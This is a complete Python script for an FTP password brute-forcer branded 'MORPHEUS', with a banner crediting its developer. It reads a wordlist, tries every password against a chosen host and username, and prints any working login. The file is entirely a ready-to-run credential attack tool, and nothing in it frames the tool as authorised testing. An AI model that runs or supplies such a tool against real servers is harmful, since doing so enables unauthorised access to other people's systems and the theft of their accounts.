import os
import socket
import argparse
import threading

from ftplib import FTP 
from sys import exit
from termcolor import colored

def banner():
    print('''


███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗███████╗
████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██║   ██║██╔════╝
██╔████╔██║██║   ██║██████╔╝██████╔╝███████║█████╗  ██║   ██║███████╗
██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██╔══╝  ██║   ██║╚════██║
██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║███████╗╚██████╔╝███████║
╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
                                                                     
                                              
[+]Developer    - Gabriel Dutra(CoolRoot)
[+]Linkedin     - linkedin.com/in/gmdutra
[+]Telegram     - @gmdutra
    ''')

def check(host, username, passwd):

    try:
        ftp = FTP(host, timeout=0.5)
        ftp.login(username, passwd)
        print_result(host, username, passwd)
        
    except:
        print (colored("[+]user={0}\tpass={1}\tfailed".format(username, \
                                                        passwd), 'red'))

def loadWordlist(host, username, wordlist):

    try:
        wd = open(wordlist, "r")
        read = wd.readlines()
        
        for line in read:
            line = line.strip()
            check(host, username, line)
    except:
        print("Nao foi possivel abrir o arquivo")

def print_result(host, username, passwd):

    print (colored('''
-------------------------------------------
            Login successful
-------------------------------------------
[+]Host     = {0}                       
[+]Username = {1}                   
[+]Password = {2}                     
-------------------------------------------
        '''.format(host, username, passwd), 'green'))
        
def main():

    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('--host',     action="store", dest="host",\
                          required=True)
   
    parser.add_argument("--user",     action="store", dest="user",\
                          required=True)
   
    parser.add_argument("--wordlist", action="store", dest="wordlist",\
                          required=True)

    given_args = parser.parse_args()

    host     = given_args.host
    user     = given_args.user
    wordlist = given_args.wordlist

    loadWordlist(host, user, wordlist)

if __name__ == '__main__':
    banner()
    main()
